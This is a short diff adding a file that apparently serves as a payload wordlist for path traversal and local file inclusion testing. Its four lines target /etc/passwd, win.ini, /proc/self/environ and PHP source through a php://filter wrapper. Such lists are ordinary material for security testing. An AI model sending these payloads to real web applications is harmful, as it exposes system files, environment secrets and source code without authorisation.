@@ -1,0 +1,5 @@
+../../../../etc/passwd
+..\..\..\..\windows\win.ini
+/proc/self/environ
+php://filter/convert.base64-encode/resource=index.php
+
